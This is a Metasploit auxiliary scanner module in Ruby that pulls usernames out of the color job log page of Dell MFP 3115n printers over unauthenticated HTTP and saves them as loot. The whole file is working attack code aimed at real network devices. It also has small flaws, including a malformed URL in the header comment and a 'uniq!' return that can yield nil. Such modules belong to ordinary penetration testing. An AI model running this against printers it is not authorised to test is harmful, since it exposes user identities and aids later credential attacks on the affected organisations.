#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Dell MFP 3115n color job username exractor',
      'Description'    => %{
      	This module is used to harvests the usernames from the color job log file on a Dell MFP 3115n.	
      },
      'Author'         =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", false]),
        OptInt.new('RPORT', [ true, "The target port", 80]),
        OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])

      ], self.class)
  end

  def run_host(ip)
  
    print_status("Attempting to enumerate usernames from: #{rhost}")

    users = get_usernames()
    return if users.nil?

    print_status("Finished extracting usernames")
    usernames = ""
    unless users.blank?
      users.each do |user|
        usernames << user << "\n"
      end
    end

    #Woot we got usernames so lets save them.
    print_good( "Found the following users: #{users}")
    loot_name     = "dell.mfp.usernames"
    loot_type     = "text/plain"
    loot_filename = "dell-usernames.text"
    loot_desc     = "Dell MFP Username Harvester"
    p = store_loot(loot_name, loot_type, datastore['RHOST'], usernames , loot_filename, loot_desc)
    print_status("Credentials saved in: #{p.to_s}")
  end


  def get_usernames()
    usernames = []
      
    begin
        res = send_request_cgi(
          {
            'uri'       => '/ews/job/log.htm',
            'method'    => 'GET',
          }, datastore['TIMEOUT'].to_i)
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
        print_error("#{rhost}:#{rport} - Connection failed.")
        return
    end

      if res == nil
        print_error("#{rhost}:#{rport} - Connection failed.")
        return false
      end
      
      html_body = ::Nokogiri::HTML(res.body)
      record_total = html_body.xpath('/html/body/table/tr/td/table[3]/tr/td/table/td').length
      record_loop = record_total/10

      $i = 13
      print_status("Trying to extract usernames")
      while record_loop > 0 do 
		tr_name = html_body.xpath("/html/body/table/tr/td/table[3]/tr/td/table/td[#{$i}]").text
		unless  tr_name.blank?
			usernames << tr_name.strip
		end 
		$i = $i + 10
		record_loop -= 1
	  end
    return usernames.uniq!
  end
end
